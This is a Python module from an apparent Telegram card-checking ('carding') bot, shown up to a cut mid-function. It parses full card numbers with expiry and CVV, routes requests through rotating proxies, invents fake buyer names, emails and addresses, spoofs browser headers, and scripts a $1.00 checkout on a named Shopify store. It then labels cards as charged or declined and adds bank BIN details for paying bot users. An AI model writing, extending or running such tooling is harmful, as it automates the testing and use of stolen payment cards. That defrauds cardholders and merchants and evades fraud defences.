# BOT/gates/charge/shopify/shopify104.py

import json
import asyncio
import re
import time
import random
import string
import base64
import httpx
import urllib.parse
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
import os
import unicodedata

# Import from helper modules
try:
    from BOT.helper.permissions import auth_and_free_restricted
except ImportError:
    def auth_and_free_restricted(func):
        async def wrapper(client, message):
            return await func(client, message)
        return wrapper

try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False
    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

try:
    from BOT.gc.credit import charge_processor
    CHARGE_PROCESSOR_AVAILABLE = True
except ImportError:
    charge_processor = None
    CHARGE_PROCESSOR_AVAILABLE = False

try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return {}

# Import smart card parser from filter.py
try:
    from BOT.helper.filter import extract_cards, normalize_year
    FILTER_AVAILABLE = True
    print("✅ Smart card parser imported successfully from filter.py")
except ImportError as e:
    print(f"❌ Filter import error: {e}")
    FILTER_AVAILABLE = False
    def extract_cards(text):
        cards = []
        for line in text.splitlines():
            parts = line.replace('|', ' ').split()
            if len(parts) >= 4:
                cards.append('|'.join(parts[:4]))
        return cards, list(set(cards))
    def normalize_year(y):
        y = y.strip()
        if len(y) == 4:
            return y[-2:]
        return y

# Import proxy system functions
try:
    from BOT.tools.proxy import (
        get_proxy_for_user,
        mark_proxy_success,
        mark_proxy_failed,
        get_random_proxy,
        parse_proxy,
        test_proxy,
        PROXY_ENABLED
    )
    PROXY_SYSTEM_AVAILABLE = True
    print("✅ Proxy system imported successfully for shopify104")
except ImportError as e:
    print(f"❌ Proxy system import error in shopify104: {e}")
    PROXY_SYSTEM_AVAILABLE = False
    def get_proxy_for_user(user_id: int, strategy: str = "random"):
        return None
    def mark_proxy_success(proxy: str, response_time: float):
        pass
    def mark_proxy_failed(proxy: str):
        pass
    def get_random_proxy():
        return None
    def parse_proxy(proxy_str: str):
        return None
    def test_proxy(proxy_str: str):
        return False

# ========== INTELLIGENT CARD PARSING (COPIED FROM SHOPIFY054.PY) ==========
def strip_all_unicode(text):
    """
    Remove ALL Unicode characters, keep only ASCII (letters, numbers, basic punctuation)
    """
    try:
        normalized = unicodedata.normalize('NFKD', text)
        ascii_text = normalized.encode('ASCII', 'ignore').decode('ASCII')
    except:
        ascii_text = ''.join(char for char in text if ord(char) < 128)
    
    cleaned = re.sub(r'[^0-9a-zA-Z\|\s,\/\-]', ' ', ascii_text)
    cleaned = re.sub(r'\s+', ' ', cleaned)
    
    return cleaned.strip()

def extract_card_from_cleaned_text(text):
    """
    Extract card details from cleaned ASCII text
    """
    pattern1 = r'(\d{13,16})\s*[|\s]\s*(\d{1,2})\s*[|\s]\s*(\d{2,4})\s*[|\s]\s*(\d{3,4})'
    match = re.search(pattern1, text)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    pattern2 = r'(\d{13,16})\s*[, ]\s*(\d{1,2})\s*[, ]\s*(\d{2,4})\s*[, ]\s*(\d{3,4})'
    match = re.search(pattern2, text)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    digits = re.findall(r'\d+', text)
    
    for i in range(len(digits) - 3):
        potential_cc = digits[i]
        potential_mes = digits[i+1]
        potential_ano = digits[i+2]
        potential_cvv = digits[i+3]
        
        if (13 <= len(potential_cc) <= 16 and 
            len(potential_mes) in [1, 2] and 
            len(potential_ano) in [2, 4] and 
            len(potential_cvv) in [3, 4]):
            
            try:
                mes_int = int(potential_mes)
                if 1 <= mes_int <= 12:
                    current_year = datetime.now().year % 100
                    
                    if len(potential_ano) == 4:
                        ano_val = int(potential_ano) % 100
                    else:
                        ano_val = int(potential_ano)
                    
                    if current_year - 5 <= ano_val <= current_year + 10:
                        cc = potential_cc
                        mes = potential_mes.zfill(2)
                        ano = potential_ano[-2:]
                        cvv = potential_cvv
                        return [cc, mes, ano, cvv]
            except:
                continue
    
    pattern4 = r'[Cc]ard:?\s*(\d{13,16}).*?(\d{1,2})[\/\-](\d{2,4}).*?(\d{3,4})'
    match = re.search(pattern4, text, re.IGNORECASE | re.DOTALL)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    pattern5 = r'(\d{13,16}).*?(\d{1,2})[\/\-](\d{2,4}).*?(\d{3,4})'
    match = re.search(pattern5, text, re.DOTALL)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    return None

def parse_card_input(card_input):
    """
    Parse card input by first stripping ALL Unicode, then extracting card details
    """
    cleaned_text = strip_all_unicode(card_input)
    result = extract_card_from_cleaned_text(cleaned_text)
    if result:
        return result
    
    if FILTER_AVAILABLE:
        all_cards, unique_cards = extract_cards(card_input)
        if unique_cards:
            card_parts = unique_cards[0].split('|')
            if len(card_parts) == 4:
                cc, mes, ano, cvv = card_parts
                if len(ano) == 4:
                    ano = ano[-2:]
                mes = mes.zfill(2)
                return [cc, mes, ano, cvv]
    
    if '|' in card_input:
        parts = card_input.split('|')
        if len(parts) >= 4:
            cc = re.sub(r'\D', '', parts[0])
            mes = re.sub(r'\D', '', parts[1])
            ano = re.sub(r'\D', '', parts[2])
            cvv = re.sub(r'\D', '', parts[3])
            if cc and mes and ano and cvv:
                if len(ano) == 4:
                    ano = ano[-2:]
                mes = mes.zfill(2)
                return [cc, mes, ano, cvv]
    
    return None
# ========== END OF INTELLIGENT CARD PARSING ==========

# ========== DETAILED LOGGER ==========
class ShopifyLogger:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.check_id = f"SCH-{random.randint(1000, 9999)}"
        self.start_time = None
        self.step_counter = 0
        self.logs = []

    def start_check(self, card_details):
        self.start_time = time.time()
        self.step_counter = 0
        cc = card_details.split('|')[0] if '|' in card_details else card_details
        masked_cc = cc[:6] + "******" + cc[-4:] if len(cc) > 10 else cc

        log_msg = f"""
🛒 [SHOPIFY SHOPIFY CHARGE 104]
   ├── Check ID: {self.check_id}
   ├── User ID: {self.user_id or 'N/A'}
   ├── Card: {masked_cc}
   ├── Start Time: {datetime.now().strftime('%H:%M:%S')}
   └── Target: zero936.com (Shopify Protection)
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def add_log(self, message):
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        self.logs.append(f"[{timestamp}] {message}")

    def step(self, step_num, step_name, action, details=None, status="PROCESSING"):
        self.step_counter += 1
        elapsed = time.time() - self.start_time if self.start_time else 0

        status_icons = {
            "PROCESSING": "🔄", "SUCCESS": "✅", "FAILED": "❌",
            "WARNING": "⚠️", "INFO": "ℹ️", "CAPTCHA": "🛡️",
            "DECLINED": "⛔", "HUMAN": "👤", "CLICK": "🖱️",
            "TYPE": "⌨️", "WAIT": "⏳"
        }
        status_icon = status_icons.get(status, "➡️")

        log_msg = f"{status_icon} STEP {step_num:02d}: {step_name}"
        log_msg += f"\n   ├── Action: {action}"
        log_msg += f"\n   ├── Elapsed: {elapsed:.2f}s"
        log_msg += f"\n   ├── Time: {datetime.now().strftime('%H:%M:%S')}"
        if details:
            log_msg += f"\n   └── Details: {details}"

        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def data_extracted(self, data_type, value, source=""):
        if isinstance(value, dict):
            value_str = json.dumps(value, indent=2)
            if len(value_str) > 150:
                value_str = value_str[:147] + "..."
        else:
            value_str = str(value)
            if len(value_str) > 100:
                value_str = value_str[:97] + "..."

        log_msg = f"   ├── 📊 Extracted {data_type}: {value_str}"
        if source:
            log_msg += f"\n   │   └── From: {source}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def card_details_log(self, cc, mes, ano, cvv):
        masked_cc = cc[:6] + "******" + cc[-4:]
        log_msg = f"""
   ├── 💳 Card Details:
   │   ├── Number: {masked_cc}
   │   ├── Expiry: {mes}/{ano}
   │   └── CVV: {'*' * len(cvv)}
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def error_log(self, error_type, message, step=""):
        error_icons = {
            "CAPTCHA": "🛡️", "DECLINED": "💳", "FRAUD": "🚫",
            "TIMEOUT": "⏰", "CONNECTION": "🔌", "UNKNOWN": "❓",
            "PROXY": "🔧", "NO_PROXY": "🚫", "PCI": "💳",
            "CHECKOUT_TOKEN": "🎫", "PROCESSING": "⏳"
        }
        error_icon = error_icons.get(error_type, "⚠️")
        log_msg = f"{error_icon} ERROR [{error_type}]: {message}"
        if step:
            log_msg += f"\n   └── At Step: {step}"
        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def success_log(self, message, details=""):
        log_msg = f"✅ SUCCESS: {message}"
        if details:
            log_msg += f"\n   └── Details: {details}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def complete_result(self, success, final_status, response_message, total_time):
        result_icon = "✅" if success else "❌"
        result_text = "APPROVED" if success else "DECLINED"

        if len(response_message) > 100:
            response_display = response_message[:97] + "..."
        else:
            response_display = response_message

        log_msg = f"""
{result_icon} [SHOPIFY SHOPIFY CHARGE COMPLETED]
   ├── Check ID: {self.check_id}
   ├── Result: {result_text}
   ├── Final Status: {final_status}
   ├── Steps Completed: {self.step_counter}
   ├── Total Time: {total_time:.2f}s
   ├── Response: {response_display}
   └── End Time: {datetime.now().strftime('%H:%M:%S')}
        """
        summary = f"📊 SUMMARY: {result_icon} {final_status} | {total_time:.2f}s | Steps: {self.step_counter}"
        self.add_log(log_msg)
        self.add_log(summary)
        print(log_msg)
        print(summary)
        print("="*80)
        return log_msg, summary

    def get_all_logs(self):
        return "\n".join(self.logs)


# ========== UTILITY FUNCTIONS ==========
def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            return json.load(f).get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    if str(user_id) in users:
        return users[str(user_id)].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False
        with open("DATA/banned_users.txt", "r") as f:
            return str(user_id) in f.read().splitlines()
    except:
        return False

def check_cooldown(user_id, command_type="sp"):
    owner_id = load_owner_id()
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15) or 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0


# ========== FORMAT RESPONSE FUNCTION ==========
def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, user_data, proxy_status="Dead 🚫"):
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"

    try:
        user_id = str(user_data.get("user_id", "Unknown"))
    except:
        user_id = None

    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        gateway = sites.get(user_id, {}).get("gate", "Shopify Charge 1.00$ 💷")
    except:
        gateway = "Shopify Charge 1.00$ 💷"

    raw_response = str(raw_response) if raw_response else "-"
    
    if "TIMEOUT" in raw_response.upper() or "PCI_ERROR" in raw_response.upper():
        status_flag = "Error❗️"
        response_display = "Try again ♻️"
    else:
        if "DECLINED - " in raw_response:
            response_display = raw_response.split("DECLINED - ")[-1]
            if ":" in response_display:
                response_display = response_display.split(":")[0].strip()
            response_display = response_display.split('\n')[0]
            if len(response_display) > 30:
                response_display = response_display[:27] + "..."
        elif "ORDER_PLACED" in raw_response.upper() or "PROCESSEDRECEIPT" in raw_response or "PROCESSED_RECEIPT" in raw_response.upper():
            response_display = "ORDER_PLACED"
        elif "APPROVED - " in raw_response:
            response_display = "APPROVED"
        elif "CHARGED" in raw_response.upper():
            response_display = "CHARGED"
        elif "GENERIC_ERROR" in raw_response:
            if ":" in raw_response:
                response_display = raw_response.split(":")[0].strip()
            else:
                response_display = "GENERIC_ERROR"
        elif "PROXY_DEAD" in raw_response:
            response_display = "PROXY_DEAD"
        elif "NO_PROXY_AVAILABLE" in raw_response:
            response_display = "NO_PROXY_AVAILABLE"
        elif "CAPTCHA" in raw_response.upper():
            response_display = "CAPTCHA"
        elif "3D" in raw_response.upper() or "3DS" in raw_response.upper():
            response_display = "3D_SECURE"
        elif "INSUFFICIENT" in raw_response.upper():
            response_display = "INSUFFICIENT_FUNDS"
        elif "INVALID" in raw_response.upper():
            response_display = "INVALID_CARD"
        elif "EXPIRED" in raw_response.upper():
            response_display = "EXPIRED_CARD"
        elif "FRAUD" in raw_response.upper():
            response_display = "FRAUD"
        elif "TAX_NEW_TAX_MUST_BE_ACCEPTED" in raw_response:
            response_display = "TAX_CHANGE"
        elif "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in raw_response:
            response_display = "PAYMENT_AMOUNT_ERROR"
        elif "PROCESSING_TIMEOUT" in raw_response:
            response_display = "PROCESSING_TIMEOUT"
        else:
            if ":" in raw_response:
                response_display = raw_response.split(":")[0].strip()
                if len(response_display) > 30:
                    response_display = response_display[:27] + "..."
            else:
                response_display = raw_response[:30] + "..." if len(raw_response) > 30 else raw_response

        raw_response_upper = raw_response.upper()

        if "NO RECEIPT ID" in raw_response_upper:
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED", "RECEIPT",
            "COMPLETED", "PAYMENT_SUCCESS", "CHARGE_SUCCESS", "THANK_YOU",
            "ORDER_CONFIRMATION", "YOUR_ORDER_IS_CONFIRMED", "ORDER_CONFIRMED",
            "SHOPIFY_PAYMENTS", "SHOP_PAY", "CHARGED", "LIVE", "PROCESSEDRECEIPT",
            "THANK YOU", "PAYMENT_SUCCESSFUL", "PROCESSINGRECEIPT", "AUTHORIZED",
            "YOUR ORDER IS CONFIRMED"
        ]):
            status_flag = "Charged ✅"
        elif any(keyword in raw_response_upper for keyword in [
            "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
            "CAPTCHA DETECTED", "CAPTCHA_REQUIRED", "CAPTCHA_VALIDATION_FAILED", 
            "CAPTCHA_ERROR", "BOT_DETECTED", "HUMAN_VERIFICATION", "SECURITY_CHECK",
            "HCAPTCHA", "CLOUDFLARE", "ENTER PAYMENT INFORMATION AND SOLVE",
            "RECAPTCHA", "I'M NOT A ROBOT", "PLEASE VERIFY"
        ]):
            status_flag = "Captcha ⚠️"
        elif any(keyword in raw_response_upper for keyword in [
            "THERE WAS AN ISSUE PROCESSING YOUR PAYMENT", "PAYMENT ISSUE",
            "ISSUE PROCESSING", "PAYMENT ERROR", "PAYMENT PROBLEM",
            "TRY AGAIN OR USE A DIFFERENT PAYMENT METHOD", "CARD WAS DECLINED",
            "YOUR PAYMENT COULDN'T BE PROCESSED", "PAYMENT FAILED"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS", "FUNDS", "NOT ENOUGH MONEY"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "INVALID CARD", "CARD IS INVALID", "CARD_INVALID", "CARD NUMBER IS INVALID"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "EXPIRED", "CARD HAS EXPIRED", "CARD_EXPIRED", "EXPIRATION DATE"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
            "3DS", "PENDING", "SECURE REQUIRED", "SECURE_CODE", "AUTH_REQUIRED",
            "3DS REQUIRED", "AUTHENTICATION_FAILED", "COMPLETEPAYMENTCHALLENGE",
            "ACTIONREQUIREDRECEIPT", "ADDITIONAL_VERIFICATION_NEEDED",
            "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE"
        ]):
            status_flag = "Approved ❎"
        elif any(keyword in raw_response_upper for keyword in [
            "INVALID CVC", "INCORRECT CVC", "CVC_INVALID", "CVV", "SECURITY CODE"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "FRAUD", "FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "FRAUDULENT",
            "RISKY", "HIGH_RISK", "SECURITY_VIOLATION", "SUSPICIOUS"
        ]):
            status_flag = "Fraud ⚠️"
        elif "NO_PROXY_AVAILABLE" in raw_response_upper or "PROXY_DEAD" in raw_response_upper:
            status_flag = "Proxy Error 🚫"
        else:
            status_flag = "Declined ❌"

    bin_data = get_bin_details(cc[:6]) or {}
    bin_info = {
        "bin": bin_data.get("bin", cc[:6]),
        "country": bin_data.get("country", "Unknown"),
        "flag": bin_data.get("flag", "🏳️"),
        "vendor": bin_data.get("vendor", "Unknown"),
        "type": bin_data.get("type", "Unknown"),
        "level": bin_data.get("level", "Unknown"),
        "bank": bin_data.get("bank", "Unknown")
    }

    try:
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎭")
        first_name = user_data.get("first_name", "User")
    except:
        plan = "Free"
        badge = "🎭"
        first_name = "User"

    clean_name = re.sub(r'[↑←«~∞🏴]', '', first_name).strip()
    profile_display = f"『{badge}』{clean_name}"

    result = f"""
<b>[#Shopify Charge] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{fullcc}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 1.00$</b>
<b>[•] Status</b>- <code>{status_flag}</code>
<b>[•] Response</b>- <code>{response_display}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin</b>: <code>{bin_info['bin']}</code>  
<b>[+] Info</b>: <code>{bin_info['vendor']} - {bin_info['type']} - {bin_info['level']}</code> 
<b>[+] Bank</b>: <code>{bin_info['bank']}</code> 🏦
<b>[+] Country</b>: <code>{bin_info['country']} - [{bin_info['flag']}]</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By</b>: {profile_display} [<code>{plan} {badge}</code>]
<b>[ϟ] Dev</b> ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━
<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>{proxy_status}</code>]
"""
    return result


# ========== ROUTE CHARGE CHECKOUT CLASS (OPTIMIZED FOR DIRECT CHECKOUT) ==========
class RouteChargeCheckout:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.base_url = "https://zero936.com"
        self.product_handle = "routeins"
        
        # Direct checkout URL (skipping product page and add-to-cart)
        self.variant_id = "51087094219071"
        self.checkout_url = f"{self.base_url}/checkout/{self.variant_id}:1"
        
        # Alternative checkout URLs to try
        self.checkout_urls = [
            f"{self.base_url}/checkout/{self.variant_id}:1",
            f"{self.base_url}/checkout?add=1&id={self.variant_id}",
            f"{self.base_url}/cart/add.js?items[0][id]={self.variant_id}&items[0][quantity]=1",
        ]
        
        # Proxy management
        self.proxy_url = None
        self.proxy_status = "Dead 🚫"
        self.proxy_used = False
        self.proxy_response_time = 0.0

        # Session for maintaining cookies
        self.client = None

        # Base headers from captured traffic
        self.headers = {
            'authority': 'zero936.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
        }

        # Dynamic data storage
        self.checkout_token = None
        self.session_token = None
        self.graphql_session_token = None
        self.receipt_id = None
        self.product_id = "10024843247935"
        self.build_id = None
        self.queue_token = None
        self.stable_id = None
        self.payment_method_identifier = None
        self.signed_handles = []

        # Store extracted schema info
        self.proposal_id = "95a8a140eea7d6e6554cfb57ab3b14e20b2bbdd72a1a8bc180e4a28918f3be8c"
        self.submit_id = "d50b365913d0a33a1d8905bfe5d0ecded1a633cb6636cbed743999cfacefa8cb"
        self.delivery_strategy_handle = "1763f757d6219a0e5606b39ac76f52c9-0749a89a340a620513a27c17fe3c9ef5"

        self.logger = ShopifyLogger(user_id)

        # Random data generators
        self.first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", 
                           "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", 
                           "Donald", "Steven", "Paul", "Andrew", "Kenneth", "Joshua", "Kevin", 
                           "Brian", "George", "Timothy", "Ronald", "Edward", "Jason", "Jeffrey",
                           "Casey", "Mini", "Bruce", "Tony", "Steve", "Peter", "Clark", "Randua",
                           "Ahley", "Ashley", "Jessica", "Sarah", "Emily", "Lisa", "Michelle"]
        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", 
                          "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", 
                          "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", 
                          "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Lang", 
                          "Trump", "Walker", "Hall", "Allen", "Young", "King"]

        self.first_name = random.choice(self.first_names)
        self.last_name = random.choice(self.last_names)
        self.full_name = f"{self.first_name} {self.last_name}"
        self.email = f"{self.first_name.lower()}{self.last_name.lower()}{random.randint(10,999)}@gmail.com"
        self.phone = f"215{random.randint(100, 999)}{random.randint(1000, 9999)}"

    async def random_delay(self, min_sec=0.1, max_sec=0.3):
        await asyncio.sleep(random.uniform(min_sec, max_sec))

    def step(self, num, name, action, details=None, status="PROCESSING"):
        return self.logger.step(num, name, action, details, status)

    def generate_random_string(self, length=16):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def generate_uuid(self):
        return f"{self.generate_random_string(8)}-{self.generate_random_string(4)}-4{self.generate_random_string(3)}-{random.choice(['8','9','a','b'])}{self.generate_random_string(3)}-{self.generate_random_string(12)}"

    def generate_tracking_ids(self):
        return self.generate_uuid(), self.generate_uuid()

    def generate_timestamp(self):
        return str(int(time.time() * 1000))

    def get_random_address(self):
        streets = ["Maple St", "Oak Ave", "Washington Blvd", "Lakeview Dr", "Park Way", "Broadway", "Elm St", "Pine Ave"]
        cities = [
            ("Ketchikan", "AK", "99901"), ("Los Angeles", "CA", "90001"),
            ("New York", "NY", "10001"), ("Houston", "TX", "77001"),
            ("Miami", "FL", "33101"), ("Chicago", "IL", "60601"),
            ("Phoenix", "AZ", "85001"), ("Seattle", "WA", "98101"),
        ]
        street = f"{random.randint(100, 9999)} {random.choice(streets)}"
        city, state, zp = random.choice(cities)
        return {
            "firstName": self.first_name,
            "lastName": self.last_name,
            "address1": street,
            "city": city,
            "zoneCode": state,
            "postalCode": zp,
            "countryCode": "US",
            "phone": self.phone,
            "company": self.generate_random_string(5)
        }

    def construct_graphql_session_token(self):
        if not self.checkout_token:
            return None
        timestamp = self.generate_timestamp()
        return f"{self.checkout_token}-{timestamp}"

    async def get_initial_session(self):
        """Step 1: Initialize session via cart.js"""
        self.step(1, "INITIALIZE SESSION", "Getting session via cart.js")
        
        try:
            resp = await self.client.get(f"{self.base_url}/cart.js", timeout=30)
            
            self.client_id = self.client.cookies.get('_shopify_y') or self.client.cookies.get('shopify_client_id') or self.generate_uuid()
            self.visit_token = self.client.cookies.get('_shopify_s') or self.generate_uuid()
            
            if resp.status_code == 200:
                try:
                    cart_data = resp.json()
                    self.cart_token = cart_data.get('token', '')
                    self.logger.data_extracted("Cart Token", self.cart_token[:20] + "..." if self.cart_token else "None")
                except:
                    pass
            
            return True
            
        except Exception as e:
            self.logger.error_log("SESSION", str(e)[:50])
            return False

    async def find_cheapest_product(self):
        """Step 2: Find cheapest available product"""
        self.step(2, "FIND PRODUCT", "Finding cheapest available product")
        
        try:
            resp = await self.client.get(f"{self.base_url}/products.json", timeout=30)
            if resp.status_code == 200:
                products = resp.json().get('products', [])
                cheapest_variant = None
                min_price = float('inf')
                for p in products:
                    for v in p.get('variants', []):
                        if v.get('available', False):
                            price = float(v.get('price', 0))
                            if price < min_price:
                                min_price = price
                                cheapest_variant = v
                                self.product_id = p.get('id')
                
                if cheapest_variant:
                    self.variant_id = cheapest_variant.get('id')
                    self.logger.data_extracted("Variant ID", self.variant_id)
                    self.logger.data_extracted("Product ID", self.product_id)
                    return True
            
            return False
            
        except Exception as e:
            self.logger.error_log("PRODUCT", str(e)[:50])
            return False

    async def add_to_cart(self):
        """Step 3: Add product to cart"""
        self.step(3, "ADD TO CART", f"Adding variant {self.variant_id} to cart")
        
        add_headers = {
            **self.headers,
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': self.base_url,
            'referer': self.base_url
        }
        
        data = {'id': self.variant_id, 'quantity': 1, 'form_type': 'product', 'utf8': '✓'}
        
        try:
            resp = await self.client.post(f"{self.base_url}/cart/add.js", data=data, headers=add_headers, timeout=30)
            
            if resp.status_code == 200:
                cart_data = resp.json()
                self.cart_token = cart_data.get('cart_token', self.cart_token)
                self.logger.data_extracted("Cart Token after add", self.cart_token[:20] + "..." if self.cart_token else "None")
                return True
            
            return False
            
        except Exception as e:
            self.logger.error_log("ADD_TO_CART", str(e)[:50])
            return False

    async def start_checkout(self):
        """Step 4: Start checkout process"""
        self.step(4, "START CHECKOUT", "Initiating checkout")
        
        checkout_headers = {
            **self.headers,
            'content-type': 'application/x-www-form-urlencoded',
            'origin': self.base_url,
            'referer': f"{self.base_url}/cart",
            'upgrade-insecure-requests': '1'
        }
        
        data = f'updates%5B%5D=1&checkout=&cart_token={self.cart_token or ""}'
        
        try:
            resp = await self.client.post(f"{self.base_url}/cart", data=data, headers=checkout_headers, follow_redirects=True, timeout=30)
            
            self.checkout_url = str(resp.url)
            
            match = re.search(r'/checkouts/(?:cn/)?([a-zA-Z0-9]+)', self.checkout_url)
            if match:
                self.checkout_token = match.group(1)
                self.logger.data_extracted("Checkout Token", self.checkout_token[:20] + "...")
                return True
            
            return False
            
        except Exception as e:
            self.logger.error_log("START_CHECKOUT", str(e)[:50])
            return False

    async def get_checkout_metadata(self):
        """Step 5: Extract tokens from checkout page"""
        self.step(5, "EXTRACT METADATA", "Extracting session tokens from checkout page")
        
        try:
            resp = await self.client.get(self.checkout_url, timeout=30)
            html_content = resp.text
            
            # Extract session token
            session_patterns = [
                r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"',
                r'"sessionToken"\s*:\s*"(AAEB[^"]+)"',
                r"'sessionToken'\s*:\s*'(AAEB[^']+)'",
                r'sessionToken[\s:=]+["\']?(AAEB[A-Za-z0-9_\-]+)',
                r'\"sessionToken\":\"(AAEB[^\"]+)',
                r'(AAEB[A-Za-z0-9_\-]{30,})',
            ]
            for pattern in session_patterns:
                match = re.search(pattern, html_content)
                if match:
                    self.session_token = match.group(1)
                    break
            
            if self.session_token:
                self.logger.data_extracted("Session Token", self.session_token[:20] + "...")
            
            # Extract queue token
            queue_patterns = [
                r'queueToken&quot;:&quot;([^&]+)&quot;',
                r'"queueToken"\s*:\s*"([^"]+)"',
            ]
            for pattern in queue_patterns:
                match = re.search(pattern, html_content)
                if match:
                    self.queue_token = match.group(1)
                    break
            
            if self.queue_token:
                self.logger.data_extracted("Queue Token", self.queue_token[:20] + "...")
            
            # Extract stable ID
            stable_patterns = [
                r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
                r'stableId[\s:=]+["\']([0-9a-f-]{36})',
            ]
            for pattern in stable_patterns:
                match = re.search(pattern, html_content)
                if match:
                    self.stable_id = match.group(1)
                    break
            
            if not self.stable_id:
                self.stable_id = self.generate_uuid()
            
            # Extract payment method identifier
            pm_patterns = [
                r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;',
                r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"',
            ]
            for pattern in pm_patterns:
                match = re.search(pattern, html_content)
                if match:
                    self.payment_method_identifier = match.group(1)
                    break
            
            # Extract build ID
            build_patterns = [
                r'"buildId"\s*:\s*"([a-f0-9]{40})"',
                r'/build/([a-f0-9]{40})/',
            ]
            for pattern in build_patterns:
                match = re.search(pattern, html_content)
                if match:
                    self.build_id = match.group(1)
                    break
            
            if not self.build_id:
                self.build_id = '4663384ede457d59be87980de7797171b19f2a1b'
            
            # Extract signed handles
            signed_handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', html_content)
